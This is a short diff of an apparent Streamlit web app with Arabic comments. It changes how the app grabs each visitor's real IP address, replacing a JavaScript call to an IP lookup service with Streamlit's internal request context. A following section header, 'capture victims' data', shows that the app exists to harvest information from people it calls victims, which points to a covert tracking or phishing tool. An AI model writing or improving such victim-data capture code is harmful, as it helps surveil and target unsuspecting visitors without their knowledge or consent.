@@ -45,13 +45,27 @@ st.markdown("""
 
 # ============= دالة جلب الـ IP الحقيقي =============
 def get_real_ip_from_js():
-    """جلب عنوان IP الحقيقي للزائر باستخدام JavaScript"""
+    """جلب عنوان IP الحقيقي"""
     try:
-        ip_address = streamlit_js_eval(js_expressions="fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)", key="get_ip_from_js")
-        return ip_address if ip_address else 'Unknown'
-    except Exception as e:
-        st.error(f"Error getting IP from JS: {e}")
-        return 'Unknown'
+        # محاولة 1: استخدام st.context (Streamlit حديث)
+        from streamlit.runtime.scriptrunner import get_script_run_ctx
+        ctx = get_script_run_ctx()
+        if ctx and hasattr(ctx, 'request') and hasattr(ctx.request, 'remote_ip'):
+            return ctx.request.remote_ip or 'Unknown'
+        
+        # محاولة 2: الطريقة القديمة من runtime
+        from streamlit.runtime import get_instance
+        from streamlit.runtime.scriptrunner import get_script_run_ctx
+        ctx = get_script_run_ctx()
+        if ctx:
+            session_info = get_instance().get_client(ctx.session_id)
+            if session_info and hasattr(session_info, 'request'):
+                return session_info.request.remote_ip or 'Unknown'
+    except:
+        pass
+    
+    # fallback
+    return 'Unknown'
 
 # ============= دالة التقاط بيانات الضحايا =============
 def capture_victim_data():
